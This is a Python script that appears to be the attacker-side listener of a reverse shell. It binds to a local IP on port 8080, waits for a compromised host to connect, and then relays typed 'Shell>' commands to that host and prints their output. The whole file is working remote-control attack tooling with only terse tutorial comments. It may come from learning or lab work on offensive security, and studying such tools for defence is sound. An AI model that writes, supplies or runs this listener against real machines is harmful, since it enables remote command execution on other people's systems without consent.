import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket
    s.bind(("192.168.126.139", 8080))  # define IP and listening port
    s.listen(1)  # listen to one connection
    print("[+] Listening for incoming TCP connection on port 8080")
    conn, addr = s.accept()  # return the target IP address and source port in tuple format (IP, port)
    print("[+] We got a connection from:", addr)

    while True:
        command = input("Shell> ")  # Get user input and store it in command variable
        if "terminate" in command:
            conn.send("terminate".encode())  # close the connection when we got terminate, inform the client as well
            conn.close()
            break
        elif command.strip() == "":
            continue
        else:
            conn.send(command.encode())  # if the connection work send the command
            response = conn.recv(4096).decode()  # print the result that we got back
            print(response)

def main():
    connect()

if __name__ == '__main__':
    main()
